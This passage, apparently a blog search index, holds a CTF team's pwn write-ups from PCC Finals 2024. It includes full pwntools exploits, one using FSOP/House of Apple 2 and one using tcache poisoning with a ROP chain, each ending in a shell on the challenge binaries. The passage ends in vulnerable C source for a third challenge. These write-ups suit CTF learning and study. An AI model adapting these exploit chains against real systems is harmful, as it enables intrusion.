{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Kernelcide","text":"<p>We are a team of researchers working on low-level exploitation and mitigation techniques. We also play CTFs on the side. This blog is a combination of our CTF playthroughs and our research</p>"},{"location":"#stdnoerr","title":"stdnoerr","text":"<p> stdnoerr stdnoerr syed-abdr</p>"},{"location":"#papadoxie","title":"papadoxie","text":"<p> nofilq papadoxie nofil-qasim</p>"},{"location":"PCC%20Finals%202024/Pwn%20Writeups%20-%20ShowDown%20%26%20CTF/","title":"Pwn Writeups   ShowDown & CTF","text":"<p>We played PCC 2024 Finals in Air University Islamabad on 13-14 Nov. It gathered teams from all over Pakistan and was a very competitive experience. The main highlight this year was their flagship ShowDown event. Which was a 1v1 elimination-based competition. All teams competed against each other in Pwn+Rev and Web in multiple rounds. We ended up in finals of ShowDown and lost in the Sudden Death round to team SUD03RS. The CTF was held the next day and was extremely competitive as well. We were 2nd when team Gryffins solved a challenge at the last moment, replacing us by a margin of 4 points. Overall, It was a healthy, top notch, quality event. Here are the writeups of Pwn challenges that we solved in ShowDown and CTF. All of these challenges was made by the great TheFlash2k and he did an amazing job.</p> <p>P.S. We were the only team to solve all pwn challenges in both competitions except ShowDown finals.</p>"},{"location":"PCC%20Finals%202024/Pwn%20Writeups%20-%20ShowDown%20%26%20CTF/#showdown","title":"ShowDown","text":""},{"location":"PCC%20Finals%202024/Pwn%20Writeups%20-%20ShowDown%20%26%20CTF/#round-1-loadme","title":"Round 1 - loadme","text":""},{"location":"PCC%20Finals%202024/Pwn%20Writeups%20-%20ShowDown%20%26%20CTF/#round-2-plusplus","title":"Round 2 - plusplus","text":""},{"location":"PCC%20Finals%202024/Pwn%20Writeups%20-%20ShowDown%20%26%20CTF/#semi-finals-jack-sparrow","title":"Semi Finals - Jack Sparrow","text":""},{"location":"PCC%20Finals%202024/Pwn%20Writeups%20-%20ShowDown%20%26%20CTF/#finals-entity-encoder","title":"Finals - Entity Encoder","text":""},{"location":"PCC%20Finals%202024/Pwn%20Writeups%20-%20ShowDown%20%26%20CTF/#ctf","title":"CTF","text":""},{"location":"PCC%20Finals%202024/Pwn%20Writeups%20-%20ShowDown%20%26%20CTF/#fhod","title":"FHoD","text":""},{"location":"PCC%20Finals%202024/Pwn%20Writeups%20-%20ShowDown%20%26%20CTF/#the-zoo","title":"The Zoo","text":""},{"location":"PCC%20Finals%202024/Pwn%20Writeups%20-%20ShowDown%20%26%20CTF/#house-of-nadeem","title":"House of Nadeem","text":""},{"location":"PCC%20Finals%202024/CTF/FHoD/","title":"FHoD","text":"<p>The first PWN challenge we faced was titled \"File Handling on Demand\". The description stated that it was a custom file handling server but that it had been tested thoroughly and shouldn't have any bugs.  </p>"},{"location":"PCC%20Finals%202024/CTF/FHoD/#analysis","title":"Analysis","text":"<p>A zip file was provided with the following contents </p> <p>The Dockerfile and docker-compose showed a pretty standard challenge setup  docker-compose.yml<pre><code>version: '3.9'\n\nservices:\n  fhod:\n    build:\n      dockerfile: ./Dockerfile.dist\n      context: .\n    ports:\n      - 31337:8000\n</code></pre></p> Dockerfile.dist<pre><code>FROM theflash2k/pwn-chal:latest\n\nENV CHAL_NAME=fhod\nCOPY ${CHAL_NAME} .\nCOPY flag.txt .\nRUN mv flag.txt flag-`cat /dev/urandom | head -10 | md5sum | cut -d ' ' -f1`.txt\n</code></pre> <p>The challenge binary notably had everything enabled except for PIE </p> <p>Source code was provided and looking through it we can see a few things  </p> <p>There is a custom file struct <code>_CUSTOM_IO_FILE_</code> that encapsulates the usual <code>FILE *</code> <pre><code>#define MAX_CONTENT_SIZE 0x100\ntypedef struct _CUSTOM_IO_FILE_ {\n    FILE *file;\n    char content[MAX_CONTENT_SIZE];\n    bool is_open;\n    _IO_MODE_ mode;\n} _CUSTOM_IO_FILE_;\n</code></pre></p> <p>Objects can be initialized in the following function <pre><code>_CUSTOM_IO_FILE_*\n_init_IO() {\n    _CUSTOM_IO_FILE_* io = (_CUSTOM_IO_FILE_*)malloc(sizeof(_CUSTOM_IO_FILE_));\n    io-&gt;file = NULL;\n    io-&gt;is_open = false;\n    return io;\n}\n</code></pre></p> <p><code>_init_IO()</code> is called at the start of the program once and the <code>_CUSTOM_IO_FILE_*</code> that is returned is used for all subsequent operations  </p> <p>The following operations are defined for <code>_CUSTOM_IO_FILE_</code> <pre><code>typedef enum _IO_MODE_ {\n    _IO_OPEN_         = 0x0, // Opening file using fopen\n    _IO_READ_         = 0x1, // Reading from file using fread\n    _IO_WRITE_        = 0x2, // Writing to file using fwrite\n    _IO_CLOSE_        = 0x3, // Closing file using fclose\n    _IO_MODIFY_       = 0x4  // Modify the contents of the file.\n} _IO_MODE_;\n</code></pre></p> <p>Before each operation, an <code>_IO_precheck</code> function is called to check whether the operation can be safely performed on the file <pre><code>_IO_ERROR_\n_IO_precheck_(const _CUSTOM_IO_FILE_ *io, _IO_MODE_ MODE) {\n\n    if(!io) {\n        __err(\n            \"_IO_precheck_(): Uninitialized _CUSTOM_IO_FILE*\", NULL_PTR);\n    } else if(MODE == _IO_READ_) { // _IO_read_\n        if(!io-&gt;file || !io-&gt;is_open) {\n            __err(\n                \"_IO_read_(): File not opened\", DO_NOT_EXIT);\n            return NULL_PTR;\n        }\n\n        if(io-&gt;mode != _IO_READ_) {\n            __err(\n                \"_IO_read_(): File was not opened in READ mode\", DO_NOT_EXIT);\n            return INVAL_MODE;\n        }\n</code></pre></p> <p>One thing of note here was that the <code>_IO_MODIFY_</code> operation did not require the file to be opened in <code>_IO_WRITE_</code> mode <pre><code>else if(MODE == _IO_MODIFY_) {\n    if(!io-&gt;file || !io-&gt;is_open) {\n        __err(\n            \"_IO_modify_(): File not opened\", DO_NOT_EXIT);\n        return NULL_PTR;\n    }\n\n    if(global_counter_handler.modify &gt;= MAX_MODIFIES_ALLOWED) {\n        __err(\n            \"_IO_modify_(): Constraint reached. Cannot modify the contents of the file.\\n\", DO_NOT_EXIT);\n        return CONSTRAINTS_ERROR;\n    }\n}\n</code></pre></p> <p>This makes sense when we look at the code for the <code>_IO_modify_</code> function <pre><code>_IO_ERROR_\n_IO_modify_(_CUSTOM_IO_FILE_* io) {\n    _IO_ERROR_ err;\n    if((err = _IO_precheck_(io, _IO_MODIFY_)) != SUCCESS) return err;\n\n    printf(\"Enter the content you want to write: \");\n    if(read(0, io-&gt;file, MAX_IO_FILE_SIZE) &lt; 0) {\n        return MODIFY_FAILED;\n    }\n    global_counter_handler.modify += 1;\n    return SUCCESS;\n}\n</code></pre> We can see that there is a read directly from <code>stdin</code> to the <code>FILE</code> struct itself rather than into the file contents. This is clearly an FSOP challenge, however, I did not know this at the time because I had never solved an FSOP challenge before Lets take a look at the rest of the code execution flow before discussing the actual exploitation phase  </p> <p>The main function is pretty simple. It starts off with instantiating a <code>_CUSTOM_IO_FILE_</code> object and then presents a menu to select from the operations discussed before <pre><code>int main(int argc, char* argv[], char* envp[]) {\n    _CUSTOM_IO_FILE_ *io = _init_IO();\n    _IO_ERROR_ err;\n    int choice;\n    int mode;\n    char buffer[MAX_CONTENT_SIZE];\n\n    while(true) {\n        printf(\"\\n\\n\");\n        menu();\n        get_input(PROMPT, &amp;choice);\n        switch(choice) {\n            case 0:\n                goto _end;\n            case 1:\n                if(_IO_precheck_(io, _IO_OPEN_) != SUCCESS) break;\n                printf(\"Enter the name of the file you want to open: \");\n                fgets(buffer, MAX_CONTENT_SIZE, stdin);\n                buffer[strcspn(buffer, \"\\n\")] = '\\0';\n                if(strstr(buffer, \"flag\")) {\n                    printf(\"*** _IO_open_(): failed. flag is an invalid keyword ***\\n\");\n                    break;\n                }\n\n                puts(\"Enter the mode you want to open the file in: \");\n</code></pre> We can see we aren't allowed to open the flag file directly. That will have to be done via exploitation This is the program in action </p>"},{"location":"PCC%20Finals%202024/CTF/FHoD/#exploitation","title":"Exploitation","text":"<p>First I figured since we had a write on the <code>FILE</code> object, we could use it to write to a soft link we had write permissions on and modify the file path it points to. This way we could possibly circumvent the check against open files with the string \"flag\" in their name. This approach, however, was quickly discarded because of three main reasons:  </p> <ul> <li><code>fopen</code> always follows soft links. We can't write to the link file itself since we always get a handle to the actual file it points to</li> <li>We need a file descriptor to write to the link but we only have a <code>FILE</code> handle instead</li> <li>We don't have any normal method of reading the file contents even after opening the file because the <code>_IO_read_</code> method doesn't display the contents of the file and there is no other function that prints out the <code>content</code> variable in <code>_CUSTOM_IO_FILE_</code> <pre><code>_IO_ERROR_\n_IO_read_(_CUSTOM_IO_FILE_* io) {\n    int nbytes;\n    _IO_ERROR_ err;\n    if((err = _IO_precheck_(io, _IO_READ_)) != SUCCESS) return err; \n\n    memset(io-&gt;content, '\\0', MAX_CONTENT_SIZE);\n    if((nbytes = fread(io-&gt;content, sizeof(char), MAX_CONTENT_SIZE, io-&gt;file)) &lt;= 0) {\n        __err(\n            \"_IO_read(): fread failed\", DO_NOT_EXIT);\n        return READ_FAILED;\n    }\n    global_counter_handler.read += 1;\n    return SUCCESS;\n}\n</code></pre></li> </ul> <p>Then I thought about writing a reverse shell to something like the user crontab file but unfortunately the environment was very minimal and did not have a cron daemon available  </p> <p>I discussed a bit with my team mate and we decided to look into FSOP. After reading a couple blogs on FSOP I found that the <code>FILE</code> write primitive that we had from <code>_IO_modify</code> was everything we needed to get arbitrary code execution. The first primitive we found was a way to convert the <code>fwrite</code> function into an <code>fread</code> from an arbitrary address onto an arbitrary file descriptor. How this works can be seen if we look into the libc implementation of <code>struct FILE</code> which is defined as follows FILE.h<pre><code>#ifndef __FILE_defined\n#define __FILE_defined 1\n\nstruct _IO_FILE;\n\n/* The opaque type of streams.  This is the definition used elsewhere.  */\ntypedef struct _IO_FILE FILE;\n\n#endif\n</code></pre></p> struct _IO_FILE<pre><code>/* offset      |    size */  type = struct _IO_FILE {\n/*      0      |       4 */    int _flags;\n/* XXX  4-byte hole      */\n/*      8      |       8 */    char *_IO_read_ptr;\n/*     16      |       8 */    char *_IO_read_end;\n/*     24      |       8 */    char *_IO_read_base;\n/*     32      |       8 */    char *_IO_write_base;\n/*     40      |       8 */    char *_IO_write_ptr;\n/*     48      |       8 */    char *_IO_write_end;\n/*     56      |       8 */    char *_IO_buf_base;\n/*     64      |       8 */    char *_IO_buf_end;\n/*     72      |       8 */    char *_IO_save_base;\n/*     80      |       8 */    char *_IO_backup_base;\n/*     88      |       8 */    char *_IO_save_end;\n/*     96      |       8 */    struct _IO_marker *_markers;\n/*    104      |       8 */    struct _IO_FILE *_chain;\n/*    112      |       4 */    int _fileno;\n/*    116      |       4 */    int _flags2;\n/*    120      |       8 */    __off_t _old_offset;\n/*    128      |       2 */    unsigned short _cur_column;\n/*    130      |       1 */    signed char _vtable_offset;\n/*    131      |       1 */    char _shortbuf[1];\n/* XXX  4-byte hole      */\n/*    136      |       8 */    _IO_lock_t *_lock;\n/*    144      |       8 */    __off64_t _offset;\n/*    152      |       8 */    struct _IO_codecvt *_codecvt;\n/*    160      |       8 */    struct _IO_wide_data *_wide_data;\n/*    168      |       8 */    struct _IO_FILE *_freeres_list;\n/*    176      |       8 */    void *_freeres_buf;\n/*    184      |       8 */    size_t __pad5;\n/*    192      |       4 */    int _mode;\n/*    196      |      20 */    char _unused2[20];\n</code></pre> <p>We need to construct an <code>_IO_FILE</code> object so that the next write operation on it reads from an address instead and gives us its contents. Luckily, since PIE is disabled, we can read from a GOT address and leak an address from libc. I chose to leak the address of <code>printf</code>. This can be done by  </p> <ul> <li>Setting <code>_flags = 0xFBAD1800</code> which corresponds to  <code>_IO_MAGIC | _IO_IS_APPENDING | _IO_IS_CURRENTLY_PUTTING</code>. See [https://elixir.bootlin.com/glibc/glibc-2.40/source/libio/libio.h]</li> <li>Setting <code>_IO_read_ptr</code>, <code>_IO_read_end</code> and <code>_IO_read_base</code> to the address of <code>printf</code> in GOT </li> <li>Setting <code>_IO_write_ptr</code> and <code>_IO_write_end</code> to the <code>address + 0x8</code> to specify end of read</li> <li>Setting <code>_fileno</code> to 1 for <code>stdout</code></li> </ul> <p>The next call to <code>_IO_write</code> leaks the address of <code>printf</code> in libc to <code>stdout</code> and then we can calculate the base address of libc from there. Once we have the libc leak we perform the next FSOP attack which is called \"House of Apple 2\"</p>"},{"location":"PCC%20Finals%202024/CTF/FHoD/#final-exploit","title":"Final Exploit","text":"exploit.py<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\nexe = ELF('./fhod_patched')\nlibc = ELF('./libc.so.6')\ncontext.binary = exe\n\nif args.REMOTE:\n    p = remote('192.168.18.50', 55590)\nelse:\n    p = process(exe.path)\n\nREAD = b\"1\"\nWRITE = b\"2\"\n\ndef debug():\n    gdb.attach(p)\n\ndef openfile(filename, mode : int):\n    p.sendlineafter('$ ', b\"1\")\n    p.sendlineafter('open: ', filename)\n    p.sendlineafter('$ ', mode)\n    p.recvuntil('Descriptor: ')\n    return p.recvline().strip()\n\ndef modify(data):\n    p.sendlineafter('$ ', b\"5\")\n    p.sendlineafter(\"write: \", data)\n\ndef read():\n    p.sendlineafter('$ ', b\"2\")\n    return p.recvall()\n\ndef closefile():\n    p.sendlineafter('$ ', b\"4\")\n    p.recvall()\n\ndef main():\n    got_printf = exe.got['printf']\n\n    structfile = openfile(b\"/tmp/hello\", WRITE)\n    structfile = int(structfile, 16)\n\n    log.info (f\"Struct file: {structfile}\")\n\n    fstruct = b\"\"\n    fstruct += p64(0xfbad1800)\n    fstruct += p64(got_printf)*3\n    fstruct += p64(got_printf)*1\n    fstruct += p64(got_printf+8)*2\n    fstruct += p64(got_printf)*7\n    fstruct += p64(0x1)\n\n    modify(fstruct)\n\n    p.sendlineafter('$ ', b\"3\")\n    p.sendlineafter(\"file: \", b\"AAAA\")\n    leak = p.recvline()[:8]\n    libc_printf = u64(leak.ljust(8, b\"\\x00\"))\n    libc.address = libc_printf - libc.sym.printf\n    log.info(f\"Libc base: {hex(libc.address)}\")\n\n    vtable = libc.sym._IO_wfile_jumps - 0x18 # _IO_wfile_overflow\n\n    payload = flat(\n        unpack(b\" sh\".ljust(8, b\"\\x00\")),\n        0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,\n        0x0, 0x0, 0x0, 0x0, 0x0, 0x0,\n        (structfile+0x78)-0x68,\n        libc.sym.system,\n        0x0, libc.bss()+0x100, 0x0,\n        structfile+0x20, structfile-0x70,\n        0x0, 0x0, 0x0, 0x0, 0x0, 0x0,\n        vtable\n    )\n    modify(payload)\n    p.sendline(\"3\")\n    p.sendline(\"A\"*10)\n    p.interactive()\n    p.close()\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"PCC%20Finals%202024/CTF/FHoD/#running-the-exploit","title":"Running the Exploit","text":""},{"location":"PCC%20Finals%202024/CTF/House%20of%20Nadeem/","title":"House of Nadeem","text":"<p>House of Nadeem was the last challenge that was released. As its name indicates, it is a heap exploitation challenge. It required understanding of glibc's ptmalloc implementation. Knowing internals of tcache is required and that is enough to complete the challenge.</p>"},{"location":"PCC%20Finals%202024/CTF/House%20of%20Nadeem/#analysis","title":"Analysis","text":"<p>We were provided a binary and after reversing, we get the following: <pre><code>int input(undefined8 msg,int lowLimit,int hiLimit)\n{\n  long in_FS_OFFSET;\n  int intval;\n  long local_10;\n\n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  printf(\"%s\",msg);\n  while( true ) {\n    __isoc99_scanf(\"%d%*c\",&amp;intval);\n    if (((lowLimit == 0) &amp;&amp; (hiLimit == 0)) || ((lowLimit &lt;= intval &amp;&amp; (intval &lt;= hiLimit)))) break;\n    error(\"Invalid choice (Range: %d-%d). Try again: \",lowLimit,hiLimit);\n  }\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n    __stack_chk_fail();\n  }\n  return intval;\n}\n\nundefined8 main(void)\n{\n  undefined4 uVar1;\n  int idx;\n  int sz;\n  void *ptr;\n  long in_FS_OFFSET;\n  void *chunks [8];\n  size_t sizes [7];\n  long local_10;\n\n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  do {\n    puts(\" === House-of-Nadeem ===\\n\");\n    puts(\"1. Allocate\");\n    puts(\"2. Free\");\n    puts(\"3. Read\");\n    puts(\"4. Write\");\n    puts(\"0. Exit\\n\");\n    uVar1 = input(\"(Nadeem)$ \",0,0);\n    switch(uVar1) {\n    case 0:\n      puts(\"See ya!\");\n      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n        __stack_chk_fail();\n      }\n      return 0;\n    case 1:\n      idx = input(\"Index? \",0,7);\n      sz = input(\"Size? \",1,0x100);\n      ptr = malloc((long)sz);\n      chunks[idx] = ptr;\n      sizes[idx] = (long)(sz + 1);\n      break;\n    case 2:\n      idx = input(\"Index? \",0,7);\n      if (chunks[idx] == (void *)0x0) {\n        error(\"Invalid index\\n\");\n      }\n      else {\n        free(chunks[idx]);\n        chunks[idx] = (void *)0x0;\n        sizes[idx] = 0;\n      }\n      break;\n    case 3:\n      idx = input(\"Index? \",0,7);\n      if (chunks[idx] == (void *)0x0) {\n        error(\"Invalid index\\n\");\n      }\n      else {\n        write(1,chunks[idx],sizes[idx]);\n      }\n      break;\n    case 4:\n      idx = input(\"Index? \",0,7);\n      if (chunks[idx] == (void *)0x0) {\n        error(\"Invalid index\\n\");\n      }\n      else {\n        read(0,chunks[idx],sizes[idx]);\n      }\n      break;\n    default:\n      error(\"Invalid choice...\\n\");\n    }\n  } while( true );\n}\n</code></pre></p> <p>The program presents us with a menu which is self-explanatory. We can allocate, free, read and write <code>malloc</code> chunks. We can utmost have 8 chunks at any given moment and the maximum size we can specify is <code>256</code> (0x100).</p> <p>The program maintains two arrays. One for the chunk pointers and other for the sizes. The sizes are used when we read and write to the chunks. The read and write are done by functions <code>write</code> and <code>read</code> respectively.</p> <p>The pointers are cleared after being freed, so on use-after-free. Looking closely at the allocation code, we see that the program adds <code>1</code> to the size we specified. This addition is only for the <code>sizes</code> array, not the chunk returned by <code>malloc</code>. This results in a one-byte buffer overflow.</p> <p>The challenge was using latest libc and had Full RELRO, PIE, NX and canary enabled. This version of libc had tcache pointer mangling.</p>"},{"location":"PCC%20Finals%202024/CTF/House%20of%20Nadeem/#exploitation","title":"Exploitation","text":"<p>Note: If you don't know any internals of ptmalloc, read the background knowledge of this writeup.</p> <p>The one-byte overflow allows us to corrupt the <code>size</code> in the chunks' metadata. This size is used by <code>free</code> to put the chunk into relevant bins. For example, when we free a chunk, <code>free</code> looks at its metadata to know what size the chunk actually has, assume it is <code>0x80</code> (not including the size of metadata). Then <code>free</code> puts the chunk in tcache bin for chunks of size <code>0x80</code>. Next time when a allocation of size <code>0x80</code> is requested the chunk in tcache bin is returned instead of making a new one.</p> <p>But what if the size has been corrupted to be a larger value? That would result in the chunk being put to a bin of the larger size and returned for allocations of that size. Suppose the chunk we were talking about previously was actually of size <code>0x40</code> and we corrupted it to <code>0x80</code>. Now the new allocation will let us write <code>0x40</code> extra byes to the chunk.</p> <p>This is what I did actually, I allocated three chunk of sizes <code>0x18</code>, <code>0x30</code> and <code>0x100</code> as <code>A</code>, <code>B</code> and <code>C</code> respectively. Used <code>A</code> to corrupt size of <code>B</code> to <code>0x81</code> (including the metadata and <code>PREV_INUSE</code> bit), this made <code>B</code> and <code>C</code> overlap, and then I freed <code>B</code>.</p> <pre><code>A = alloc(0, 0x18)\nB = alloc(1, 0x30)\nC = alloc(2, 0x100)\nD = alloc(6, 0x100) # More on this later\n\nwrite(A, b'A'*0x18 + b'\\x81')\n\nfree(B)\n</code></pre> <p>Then I re-allocated <code>B</code> as a chunk of size <code>0x70</code>. This will allow me to overflow into metadata of <code>C</code> and <code>0x30</code> bytes of <code>C</code>'s data. After re-allocation, <code>B</code> still had the mangled pointer. Since <code>B</code> had no next chunk, this was a pointer of heap base shift by <code>12</code> bits. I read the value and shifted it to the left by <code>12</code> bits to recover the pointer.</p> <pre><code>B = alloc(B, 0x70)\nread(B)\n\nheap_base = u64(p.recv(8)) &lt;&lt; 12\nprint(hex(heap_base))\n</code></pre> <p>Then I decided to do tcache poisoning to get <code>tcache_perthread_struct</code>. This would allow me to control what addresses are returned by tcache for <code>malloc</code> and how <code>free</code> will behave for tcache size chunks as well. For the poisoning attack, I freed <code>D</code> and <code>C</code> in order and used the overflow from <code>B</code> to overwrite <code>C</code>'s next pointer to point to <code>tcache_perthread_struct</code> (following the pointer mangling mechanism). Then allocated twice to claim the <code>tcache_perthread_struct</code>. <pre><code>free(D)\nfree(C)\n\nwrite(B, b'A'*0x38 + p64(0x111) + p64((heap_base + 0x10) ^ (heap_base &gt;&gt; 12)))\n\nC = alloc(C, 0x100)\ntcache_perthread = alloc(3, 0x100)\n</code></pre></p> <p>Since the libc was latest, hooks were not gonna work. I decided to a similar approach to The Zoo and overwrite <code>main</code>'s return to write rop chain. For that I needed libc leak and stack leak.</p> <p>For libc leak, I forced <code>C</code> to be put in unsorted bin by writing <code>7</code> to all tcache bins counters. Then I read the libc leak using <code>B</code>. <pre><code>write(tcache_perthread, b'\\x07\\x00'*64)\n\nfree(C)\nread(B)\n\np.recv(0x38 + 8)\nlibc_leak = u64(p.recv(8))\nlibc.address = libc_leak - 0x203b20\n\nprint(hex(libc.address))\n</code></pre></p> <p>For stack leak, I wrote <code>1</code> to all tcache bin counters and put address of <code>environ</code> to tcache bins heads. This will return <code>environ</code> by <code>malloc</code> that I can then read. But this didn't work because for some reason, <code>environ</code> had no pointer. It was <code>NULL</code>. Then I used <code>gef</code>'s <code>search libc stack</code> for finding stack pointers in libc and used one of them. <pre><code>write(tcache_perthread, b'\\x01\\x00'*64 + p64(libc.address + 0x2046e0)*16)\n\nleak = alloc(4, 0x50)\n\nread(leak)\nstack_leak = u64(p.recv(8))\n</code></pre></p> <p>Then I used the same technique to get pointer at the return location of <code>main</code> to write rop chain. Because tcache pointers need to 16-byte aligned, I subtracted <code>8</code> to overwrite from the saved <code>rbp</code>. Then I wrote a simple <code>ret2libc</code> rop to run <code>system</code> and get shell.</p> <pre><code>write(tcache_perthread, b'\\x01\\x00'*64 + p64(stack_leak - 296)*16)\n\nrop = alloc(5, 0x50)\n\nwrite(rop, b''.join([p64(x) for x in [\n    0, # rbp\n    libc.address + POP_RDI, libc.address + 0x1cb42f,\n    libc.address + POP_RDI + 1,\n    libc.sym.system]]))\n\nsendchoice(0)\n</code></pre>"},{"location":"PCC%20Finals%202024/CTF/House%20of%20Nadeem/#final-exploit","title":"Final Exploit","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef start() -&gt; tube:\n    if args.REMOTE:\n        return remote(\"192.168.18.50\", 33427)\n    else:\n        return elf.process()\n\ndef attach_gdb() -&gt; None:\n    if args.REMOTE or args.NOGDB:\n        return\n\n    gdb.attach(p, '''\n    heap chunks\n    heap bins\n    continue\n               ''')\n    input(\"ATTACHED?\")\n\ndef sendchoice(choice: int):\n    p.sendlineafter(\"$ \", str(choice).encode())\n\ndef alloc(idx: int, size: int):\n    sendchoice(1)\n\n    p.sendlineafter(\"? \", str(idx).encode())\n    p.sendlineafter(\"? \", str(size).encode())\n\n    return idx\n\ndef free(idx: int):\n    sendchoice(2)\n\n    p.sendlineafter(\"? \", str(idx).encode())\n\ndef read(idx: int):\n    sendchoice(3)\n\n    p.sendlineafter(\"? \", str(idx).encode())    \n\ndef write(idx: int, payload: bytes):\n    sendchoice(4)\n\n    p.sendlineafter(\"? \", str(idx).encode())\n    p.send(payload)\n\ncontext.binary = elf = ELF(\"./house-of-nadeem_patched\")\nlibc = elf.libc\n\nPOP_RDI = 0x000000000010f75b\n\np = start()\n\n# Allocations\nA = alloc(0, 0x18)\nB = alloc(1, 0x30)\nC = alloc(2, 0x100)\nD = alloc(6, 0x100)\n\n# Use one-byte overflow to overflow B and C\nwrite(A, b'A'*0x18 + b'\\x81')\nfree(B)\n\n# Get overlapped chunk\nB = alloc(B, 0x70)\nread(B)\n\n# Read mangled pointer\nheap_base = u64(p.recv(8)) &lt;&lt; 12\n\nprint(hex(heap_base))\n\n# tcache poisoning to get tcache_perthread_struct\nfree(D)\nfree(C)\n\nwrite(B, b'A'*0x38 + p64(0x111) + p64((heap_base + 0x10) ^ (heap_base &gt;&gt; 12)))\n\nC = alloc(C, 0x100)\n\ntcache_perthread = alloc(3, 0x100)\n\n# Force C into unsorted bin\nwrite(tcache_perthread, b'\\x07\\x00'*64)\n\nfree(C)\nread(B)\n\n# Read libc leak\np.recv(0x38 + 8)\nlibc_leak = u64(p.recv(8))\nlibc.address = libc_leak - 0x203b20\n\nprint(hex(libc.address))\n\n# Read stack leak from libc\nwrite(tcache_perthread, b'\\x01\\x00'*64 + p64(libc.address + 0x2046e0)*16)\n\nleak = alloc(4, 0x50)\n\nread(leak)\nstack_leak = u64(p.recv(8))\n\n# Get pointer to main's return\nwrite(tcache_perthread, b'\\x01\\x00'*64 + p64(stack_leak - 296)*16)\n\nrop = alloc(5, 0x50)\n\nwrite(rop, b''.join([p64(x) for x in [\n    0, # rbp\n    libc.address + POP_RDI, libc.address + 0x1cb42f,\n    libc.address + POP_RDI + 1,\n    libc.sym.system]]))\n\nsendchoice(0)\n\np.interactive()\np.close()\n</code></pre>"},{"location":"PCC%20Finals%202024/CTF/The%20Zoo/","title":"The Zoo","text":"<p>The Zoo was the second pwn challenge in the CTF and we were provided C source code.</p>"},{"location":"PCC%20Finals%202024/CTF/The%20Zoo/#code-analysis","title":"Code Analysis","text":"<pre><code>/ Compile: gcc -o packed packed.c\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;unistd.h&gt;\n\n#define MAX_OBJS 0x10 // Number of max elements allowed.\n#define MAX_BUFFER_SIZE 0x18\n\nint __flush;\n\n__attribute__((constructor))\nvoid __constructor__(){\n    setvbuf(stdin, NULL, _IOFBF, 0);\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stderr, NULL, _IONBF, 0);\n}\n\nstruct Owner {\n    int32_t id;\n    int8_t ownedAnimals;\n    char *name;\n} __attribute__((packed));\n\nstruct Animal {\n    char *name;\n    int price;\n    int32_t id;\n    int owner_id;\n    int32_t is_sold;\n} __attribute__((packed));\n\nstruct Zoo {\n    int32_t zoo_id;\n    char *name;\n    void (*handler)();\n};\n\n/* Globals */\nint32_t g_zooID = 0, g_animalID = 0, g_ownerID = 0;\nstruct Zoo*    zoos[MAX_OBJS];\nstruct Animal* animals[MAX_OBJS];\nstruct Owner*  owners[MAX_OBJS];\n\nvoid init_app() {\n    for(int i = 0; i &lt; MAX_OBJS; i++) {\n        zoos[i]    = NULL;\n        owners[i]  = NULL;\n        animals[i] = NULL;\n    }\n}\n\n/* All Owner related tasks: */\nvoid create_owner() {\n    if(g_ownerID &gt;= MAX_OBJS) {\n        printf(\"[!] Maximum number of owners created.\\n\");\n        exit(1);\n    }\n\n    struct Owner *owner = (struct Owner*)malloc(sizeof(struct Owner)); // 0xd\n    owner-&gt;name = (char*)malloc(MAX_BUFFER_SIZE);\n    printf(\"Enter your name: \");\n    fgets(owner-&gt;name, MAX_BUFFER_SIZE, stdin);\n\n    owner-&gt;id = g_ownerID++;\n    owner-&gt;ownedAnimals = 0;\n    owners[owner-&gt;id] = owner;\n    printf(\"[*] Created owner %s with id: %d\\n\", owner-&gt;name, owner-&gt;ownedAnimals);\n}\n\nvoid delete_owner() {\n    if(g_ownerID &lt;= 0) {\n        printf(\"[!] Cannot delete non-existing users.\\n\");\n        exit(1);\n    }\n\n    int id;\n    printf(\"Enter the id you want to delete: \");\n    scanf(\"%d%*c\", &amp;id);\n    if(id &lt; 0 || id &gt;= MAX_OBJS) {\n        printf(\"[!] Cannot read data from out of bounds\\n\");\n        exit(1);\n    }\n\n    if(!owners[id]) {\n        printf(\"[!] Cannot empty an already empty owner chunk.\");\n        exit(1);\n    }\n    void *name = owners[id]-&gt;name;\n    free(owners[id]);\n    if(name) free(name);\n    printf(\"[*] Owner %d deleted successfully.\\n\", id);\n}\n\n/* All Animal related tasks */\nvoid create_animal() {\n    if(g_animalID &gt;= MAX_OBJS) {\n        printf(\"[!] Maximum number of animals created.\\n\");\n        exit(1);\n    }\n\n    struct Animal *animal = (struct Animal*)malloc(sizeof(struct Animal)); // 0x18\n    animal-&gt;name = (char*)malloc(MAX_BUFFER_SIZE);\n    printf(\"Enter the name of the animal: \");\n    read(0, animal-&gt;name, MAX_BUFFER_SIZE);\n    animal-&gt;name[strcspn(animal-&gt;name, \"\\n\")] = 0x0;\n    printf(\"Enter the price of the animal: \");\n    scanf(\"%d%*c\", &amp;animal-&gt;price);\n    animal-&gt;id = g_animalID++;\n    animal-&gt;owner_id = -1;\n    animal-&gt;is_sold = false;\n    animals[animal-&gt;id] = animal;\n    printf(\"[*] Created animal %s with id: %d\\n\", animal-&gt;name, animal-&gt;id);\n}\nvoid delete_animal() {\n    int id;\n    printf(\"Enter the id you want to delete: \");\n    scanf(\"%d%*c\", &amp;id);\n    if(id &lt; 0 || id &gt;= MAX_OBJS) {\n        printf(\"[!] Cannot read data from out of bounds\\n\");\n        exit(1);\n    }\n\n    if(!animals[id]) {\n        printf(\"[!] Cannot empty an already empty animal chunk.\");\n        exit(1);\n    }\n    void *name = animals[id]-&gt;name;     \n    free(animals[id]);\n    if(name) free(name);\n    printf(\"[*] Animal %d deleted successfully.\\n\", id);\n}\nvoid modify_animal() {\n    int id;\n    printf(\"Enter the id you want to modify: \");\n    scanf(\"%d%*c\", &amp;id);\n    if(id &lt; 0 || id &gt;= MAX_OBJS) {\n        printf(\"[!] Cannot read data from out of bounds\\n\");\n        exit(1);\n    }\n\n    